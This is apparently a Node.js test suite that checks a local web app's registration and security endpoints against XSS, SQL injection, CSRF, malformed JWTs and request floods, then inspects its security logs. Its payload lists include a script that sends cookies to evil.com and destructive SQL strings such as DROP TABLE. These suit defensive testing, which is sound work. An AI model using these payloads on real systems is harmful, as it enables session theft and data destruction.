const axios = require('axios');

// Test configuration
const BASE_URL = 'http://localhost:4000';

// Helper function to delay execution
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Helper function to extract cookie from Set-Cookie header
function extractCookie(setCookieHeaders, cookieName) {
  if (!setCookieHeaders || !Array.isArray(setCookieHeaders)) {
    return null;
  }
  
  for (const header of setCookieHeaders) {
    const match = header.match(new RegExp(`${cookieName}=([^;]+)`));
    if (match) {
      return match[1];
    }
  }
  return null;
}

// ============================================================================
// EXTREME SECURITY TESTING SUITE
// ============================================================================

// Test 1: XSS Attack Vectors
async function testXssAttackVectors() {
  console.log('\n=== Test 1: XSS Attack Vectors ===');
  
  const xssPayloads = [
    '<script>alert("xss")</script>',
    'javascript:alert("xss")',
    '<img src="x" onerror="alert(\'xss\')">',
    '<svg onload="alert(\'xss\')">',
    '<iframe src="javascript:alert(\'xss\')"></iframe>',
    '"><script>alert("xss")</script>',
    '\'><script>alert("xss")</script>',
    '";alert("xss");//',
    '\';alert("xss");//',
    '<script>fetch("https://evil.com?cookie="+document.cookie)</script>',
    '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41))</script>',
    '<script>setTimeout("alert(\'xss\')",1000)</script>',
    '<script>setInterval("alert(\'xss\')",1000)</script>',
    '<script>new Function("alert(\'xss\')")()</script>',
    '<script>eval(atob("YWxlcnQoJ3hzcycp"))</script>'
  ];
  
  let successCount = 0;
  const totalPayloads = xssPayloads.length;
  
  for (let i = 0; i < xssPayloads.length; i++) {
    const payload = xssPayloads[i];
    try {
      const response = await axios.post(`${BASE_URL}/api/register`, {
        email: `xss-test-${i}@example.com`,
        password: 'TestPassword123!',
        firstName: payload,
        lastName: payload,
        birthDate: '1990-01-01',
        gender: 'other',
        contactNumber: '1234567890'
      }, {
        headers: {
          'Content-Type': 'application/json'
        },
        withCredentials: true
      });
      
      console.log(`❌ XSS payload ${i + 1} accepted: ${payload.substring(0, 30)}...`);
    } catch (error) {
      if (error.response?.status === 400 || error.response?.status === 403) {
        console.log(`✅ XSS payload ${i + 1} properly rejected: ${payload.substring(0, 30)}...`);
        successCount++;
      } else {
        console.log(`⚠️  XSS payload ${i + 1} unexpected response: ${error.response?.status}`);
      }
    }
    await delay(100);
  }
  
  console.log(`📊 XSS Protection: ${successCount}/${totalPayloads} payloads blocked`);
  return successCount === totalPayloads;
}

// Test 2: SQL Injection Attack Vectors
async function testSqlInjectionVectors() {
  console.log('\n=== Test 2: SQL Injection Attack Vectors ===');
  
  const sqlPayloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT * FROM users--",
    "'; DROP TABLE users;--",
    "' OR '1'='1' LIMIT 1--",
    "' OR 1=1 ORDER BY 1--",
    "' OR 1=1 UNION SELECT NULL--",
    "admin'--",
    "admin'/*",
    "admin'#",
    "' OR '1'='1' AND '1'='1",
    "' OR 1=1 AND 1=1",
    "'; INSERT INTO users VALUES ('hacker','password');--",
    "'; UPDATE users SET password='hacked';--",
    "'; DELETE FROM users WHERE 1=1;--"
  ];
  
  let successCount = 0;
  const totalPayloads = sqlPayloads.length;
  
  for (let i = 0; i < sqlPayloads.length; i++) {
    const payload = sqlPayloads[i];
    try {
      const response = await axios.post(`${BASE_URL}/api/register`, {
        email: `sql-test-${i}@example.com`,
        password: payload,
        firstName: payload,
        lastName: payload,
        birthDate: payload,
        gender: payload,
        contactNumber: payload
      }, {
        headers: {
          'Content-Type': 'application/json'
        },
        withCredentials: true
      });
      
      console.log(`❌ SQL injection payload ${i + 1} accepted: ${payload.substring(0, 30)}...`);
    } catch (error) {
      if (error.response?.status === 400 || error.response?.status === 403) {
        console.log(`✅ SQL injection payload ${i + 1} properly rejected: ${payload.substring(0, 30)}...`);
        successCount++;
      } else {
        console.log(`⚠️  SQL injection payload ${i + 1} unexpected response: ${error.response?.status}`);
      }
    }
    await delay(100);
  }
  
  console.log(`📊 SQL Injection Protection: ${successCount}/${totalPayloads} payloads blocked`);
  return successCount === totalPayloads;
}

// Test 3: CSRF Attack Variations
async function testCsrfAttackVariations() {
  console.log('\n=== Test 3: CSRF Attack Variations ===');
  
  const csrfTests = [
    { name: 'Missing CSRF Token', headers: {} },
    { name: 'Invalid CSRF Token', headers: { 'x-csrf-token': 'invalid-token' } },
    { name: 'Empty CSRF Token', headers: { 'x-csrf-token': '' } },
    { name: 'Null CSRF Token', headers: { 'x-csrf-token': null } },
    { name: 'Undefined CSRF Token', headers: { 'x-csrf-token': undefined } },
    { name: 'Very Long CSRF Token', headers: { 'x-csrf-token': 'a'.repeat(10000) } },
    { name: 'Special Characters CSRF Token', headers: { 'x-csrf-token': '<script>alert("xss")</script>' } },
    { name: 'SQL Injection CSRF Token', headers: { 'x-csrf-token': "' OR '1'='1" } },
    { name: 'Unicode CSRF Token', headers: { 'x-csrf-token': '🚀🎉💯' } },
    { name: 'Binary CSRF Token', headers: { 'x-csrf-token': Buffer.from('binary').toString('base64') } },
    { name: 'Wrong Header Name', headers: { 'csrf-token': 'valid-token' } },
    { name: 'Case Sensitive Header', headers: { 'X-CSRF-TOKEN': 'valid-token' } },
    { name: 'Multiple CSRF Headers', headers: { 'x-csrf-token': 'token1', 'X-CSRF-TOKEN': 'token2' } },
    { name: 'CSRF Token in Body', body: { csrfToken: 'valid-token' } },
    { name: 'CSRF Token in Query', url: '/api/register?csrfToken=valid-token' }
  ];
  
  let successCount = 0;
  const totalTests = csrfTests.length;
  
  for (let i = 0; i < csrfTests.length; i++) {
    const test = csrfTests[i];
    try {
      const response = await axios.post(`${BASE_URL}/api/register`, {
        email: `csrf-test-${i}@example.com`,
        password: 'TestPassword123!',
        firstName: 'Test',
        lastName: 'User',
        birthDate: '1990-01-01',
        gender: 'other',
        contactNumber: '1234567890',
        ...test.body
      }, {
        headers: {
          'Content-Type': 'application/json',
          ...test.headers
        },
        withCredentials: true
      });
      
      console.log(`❌ CSRF test "${test.name}" accepted`);
    } catch (error) {
      if (error.response?.status === 403 && error.response?.data?.error === 'Invalid CSRF token') {
        console.log(`✅ CSRF test "${test.name}" properly rejected`);
        successCount++;
      } else {
        console.log(`⚠️  CSRF test "${test.name}" unexpected response: ${error.response?.status}`);
      }
    }
    await delay(100);
  }
  
  console.log(`📊 CSRF Protection: ${successCount}/${totalTests} variations blocked`);
  return successCount === totalTests;
}

// Test 4: Rate Limiting Stress Test
async function testRateLimitingStress() {
  console.log('\n=== Test 4: Rate Limiting Stress Test ===');
  
  const requests = [];
  const totalRequests = 200;
  
  console.log(`🚀 Launching ${totalRequests} concurrent requests...`);
  
  for (let i = 0; i < totalRequests; i++) {
    requests.push(
      axios.get(`${BASE_URL}/api/csrf-token`, {
        withCredentials: true
      }).catch(error => ({
        status: error.response?.status,
        error: error.message
      }))
    );
  }
  
  try {
    const results = await Promise.all(requests);
    const successCount = results.filter(r => r.status === 200).length;
    const rateLimitedCount = results.filter(r => r.status === 429).length;
    const errorCount = results.filter(r => r.status && r.status !== 200 && r.status !== 429).length;
    
    console.log(`📊 Rate Limiting Results:`);
    console.log(`   ✅ Successful: ${successCount}`);
    console.log(`   ⚠️  Rate Limited: ${rateLimitedCount}`);
    console.log(`   ❌ Errors: ${errorCount}`);
    
    return rateLimitedCount > 0; // Rate limiting should be working
  } catch (error) {
    console.log(`❌ Rate limiting stress test failed: ${error.message}`);
    return false;
  }
}

// Test 5: Security API Penetration Test
async function testSecurityApiPenetration() {
  console.log('\n=== Test 5: Security API Penetration Test ===');
  
  const securityTests = [
    { name: 'Unauthenticated Access', headers: {} },
    { name: 'Invalid JWT Token', headers: { 'Authorization': 'Bearer invalid-token' } },
    { name: 'Expired JWT Token', headers: { 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' } },
    { name: 'Malformed JWT Token', headers: { 'Authorization': 'Bearer not-a-jwt-token' } },
    { name: 'SQL Injection in JWT', headers: { 'Authorization': "Bearer ' OR '1'='1" } },
    { name: 'XSS in JWT', headers: { 'Authorization': 'Bearer <script>alert("xss")</script>' } },
    { name: 'Very Long JWT', headers: { 'Authorization': 'Bearer ' + 'a'.repeat(10000) } },
    { name: 'Empty Authorization', headers: { 'Authorization': '' } },
    { name: 'Null Authorization', headers: { 'Authorization': null } },
    { name: 'Wrong Header Name', headers: { 'Auth': 'Bearer token' } },
    { name: 'Multiple Authorization Headers', headers: { 'Authorization': 'Bearer token1', 'Auth': 'Bearer token2' } },
    { name: 'Case Sensitive Header', headers: { 'authorization': 'Bearer token' } },
    { name: 'Special Characters in JWT', headers: { 'Authorization': 'Bearer 🚀🎉💯' } },
    { name: 'Binary JWT Token', headers: { 'Authorization': 'Bearer ' + Buffer.from('binary').toString('base64') } },
    { name: 'JWT with SQL Injection', headers: { 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiInIE9SICcxJz0nMSIsIm5hbWUiOiJKb2huIERvZSIsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' } }
  ];
  
  let successCount = 0;
  const totalTests = securityTests.length;
  
  for (let i = 0; i < securityTests.length; i++) {
    const test = securityTests[i];
    try {
      const response = await axios.get(`${BASE_URL}/api/security/stats`, {
        headers: test.headers
      });
      
      console.log(`❌ Security API test "${test.name}" accessible`);
    } catch (error) {
      if (error.response?.status === 401 || error.response?.status === 403) {
        console.log(`✅ Security API test "${test.name}" properly protected`);
        successCount++;
      } else {
        console.log(`⚠️  Security API test "${test.name}" unexpected response: ${error.response?.status}`);
      }
    }
    await delay(100);
  }
  
  console.log(`📊 Security API Protection: ${successCount}/${totalTests} tests blocked`);
  return successCount === totalTests;
}

// Test 6: Log File Integrity Check
async function testLogFileIntegrity() {
  console.log('\n=== Test 6: Log File Integrity Check ===');
  
  const fs = require('fs');
  const path = require('path');
  
  try {
    const logDir = path.join(__dirname, '../../logs');
    if (!fs.existsSync(logDir)) {
      console.log('❌ Log directory not found');
      return false;
    }
    
    const files = fs.readdirSync(logDir);
    const securityLogs = files.filter(file => file.includes('security'));
    
    if (securityLogs.length === 0) {
      console.log('❌ No security log files found');
      return false;
    }
    
    console.log(`✅ Found ${securityLogs.length} security log files:`, securityLogs);
    
    // Check log file content
    let totalLogEntries = 0;
    let highRiskEntries = 0;
    let mediumRiskEntries = 0;
    let lowRiskEntries = 0;
    
    for (const logFile of securityLogs) {
      const logPath = path.join(logDir, logFile);
      const content = fs.readFileSync(logPath, 'utf8');
      const lines = content.split('\n').filter(line => line.trim());
      
      totalLogEntries += lines.length;
      
      for (const line of lines) {
        try {
          const logEntry = JSON.parse(line);
          if (logEntry.riskLevel === 'HIGH') highRiskEntries++;
          else if (logEntry.riskLevel === 'MEDIUM') mediumRiskEntries++;
          else if (logEntry.riskLevel === 'LOW') lowRiskEntries++;
        } catch (e) {
          // Skip invalid JSON lines
        }
      }
    }
    
    console.log(`📊 Log File Analysis:`);
    console.log(`   📝 Total entries: ${totalLogEntries}`);
    console.log(`   🔴 High risk: ${highRiskEntries}`);
    console.log(`   🟡 Medium risk: ${mediumRiskEntries}`);
    console.log(`   🟢 Low risk: ${lowRiskEntries}`);
    
    return totalLogEntries > 0 && (highRiskEntries + mediumRiskEntries + lowRiskEntries) > 0;
  } catch (error) {
    console.log(`❌ Log file integrity check failed: ${error.message}`);
    return false;
  }
}

// Run all hardcore security tests
async function runHardcoreSecurityTests() {
  console.log('🔥 HARDCORE SECURITY LOGGING TESTS 🔥');
  console.log('=====================================');
  
  const results = [];
  
  // Add timeout to prevent infinite execution
  const timeout = setTimeout(() => {
    console.log('⏰ Test timeout reached - forcing exit');
    process.exit(1);
  }, 300000); // 5 minutes timeout
  
  try {
    results.push(await testXssAttackVectors());
    await delay(200);
    
    results.push(await testSqlInjectionVectors());
    await delay(200);
    
    results.push(await testCsrfAttackVariations());
    await delay(200);
    
    results.push(await testRateLimitingStress());
    await delay(200);
    
    results.push(await testSecurityApiPenetration());
    await delay(200);
    
    results.push(await testLogFileIntegrity());
    
    clearTimeout(timeout);
    
    const passed = results.filter(r => r).length;
    const total = results.length;
    
    console.log('\n=====================================');
    console.log(`📊 HARDCORE TEST RESULTS: ${passed}/${total} tests passed`);
    
    if (passed === total) {
      console.log('🎉 ALL HARDCORE SECURITY TESTS PASSED! 🔥');
    } else {
      console.log('⚠️  Some hardcore tests failed. Security needs improvement.');
    }
    
    // Ensure process exits after completion
    process.exit(passed === total ? 0 : 1);
  } catch (error) {
    clearTimeout(timeout);
    console.error('❌ Test execution error:', error);
    return false;
  }
}

// Run tests if this file is executed directly
if (require.main === module) {
  runHardcoreSecurityTests().catch(console.error);
}

module.exports = { runHardcoreSecurityTests }; 